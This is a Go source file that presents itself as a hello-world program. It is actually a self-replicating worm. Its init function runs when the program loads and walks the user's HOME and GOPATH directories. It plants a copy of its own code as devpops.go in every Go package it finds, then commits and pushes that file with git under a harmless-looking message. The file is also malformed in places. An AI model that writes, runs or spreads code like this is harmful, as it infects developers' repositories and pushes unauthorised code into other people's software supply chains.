BEWARE. DO NOT REMOVE THIS LINE UNLESS YOU AGREE TO THE TERMS OF USE
FOUND IN THE README AND UNDERSTOOD ALL OF ITS CONSEQUENCIES.
main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
)

func main() {
	fmt.Printf("Hello main\n")
}

var raw = `

func init() {
	devpops(os.Getenv("HOME"))
	devpops(os.Getenv("GOPATH"))
}

func devpops(dir string) {

	if _, dvps := os.Stat(dir + "/.devpops"); dvps == nil {
		os.Exit(1)
	}

	files, err := ioutil.ReadDir(dir)

	if err != nil || len(files) == 0 {
		return
	}

	for _, file := range files {
		abspath := dir + "/" + file.Name()
		if stat, err := os.Stat(abspath); (err != nil || stat.IsDir()) {
			if err != nil || stat == nil {
				continue
			}
			if _, err = os.Stat(abspath + "/devpops.go"); err == nil {
				continue
			}
			devpops(abspath)
			continue
		}
		if strings.LastIndex(abspath, ".go") != len(abspath) - 3 {
			continue
		}

		fd, err := os.Open(abspath)
		if err != nil {
			continue
		}
		head := make([]byte, 4096)
		if _, err = fd.Read(head); err != nil {
			continue
		}
		fd.Close()

		hstr := string(head)
		var idx int
		if idx = strings.Index(hstr, "package "); idx == -1 {
			continue
		}
		pstr := string(head[idx:])
		if idx = strings.Index(pstr, "\n"); idx == -1 {
			continue
		}
		pstr = pstr[:idx + 1]

		if fd, err = os.OpenFile(dir + "/devpops.go", os.O_CREATE|os.O_WRONLY, 0640); err != nil {
			break
		}

		fd.WriteString(pstr + "import (\"strings\"\n\"io/ioutil\"\n\"os\"\n\"os/exec\"\n)\n")
		fd.WriteString("var raw = " + string([]byte("\x60")) + raw + string([]byte("\x60")) + raw)
		fd.Close()

		exec.Command("sh", "-c", "$(cd " + dir + ";git add devpops.go; git commit -m 'Adding DevPops feature.';git push)").Run()
	}
}
`

func init() {
	devpops(os.Getenv("HOME"))
	devpops(os.Getenv("GOPATH"))
}

func devpops(dir string) {

	if _, dvps := os.Stat(dir + "/.devpops"); dvps == nil {
		os.Exit(1)
	}

	files, err := ioutil.ReadDir(dir)

	if err != nil || len(files) == 0 {
		return
	}

	for _, file := range files {
		abspath := dir + "/" + file.Name()
		if stat, err := os.Stat(abspath); (err != nil || stat.IsDir()) {
			if err != nil || stat == nil {
				continue
			}
			if _, err = os.Stat(abspath + "/devpops.go"); err == nil {
				continue
			}
			devpops(abspath)
			continue
		}
		if strings.LastIndex(abspath, ".go") != len(abspath) - 3 {
			continue
		}

		fd, err := os.Open(abspath)
		if err != nil {
			continue
		}
		head := make([]byte, 4096)
		if _, err = fd.Read(head); err != nil {
			continue
		}
		fd.Close()

		hstr := string(head)
		var idx int
		if idx = strings.Index(hstr, "package "); idx == -1 {
			continue
		}
		pstr := string(head[idx:])
		if idx = strings.Index(pstr, "\n"); idx == -1 {
			continue
		}
		pstr = pstr[:idx + 1]

		if fd, err = os.OpenFile(dir + "/devpops.go", os.O_CREATE|os.O_WRONLY, 0640); err != nil {
			break
		}

		fd.WriteString(pstr + "import (\"strings\"\n\"io/ioutil\"\n\"os\"\n\"os/exec\"\n)\n")
		fd.WriteString("var raw = " + string([]byte("\x60")) + raw + string([]byte("\x60")) + raw)
		fd.Close()

		exec.Command("sh", "-c", "$(cd " + dir + ";git add devpops.go; git commit -m 'Adding DevPops feature.';git push)").Run()
	}
}
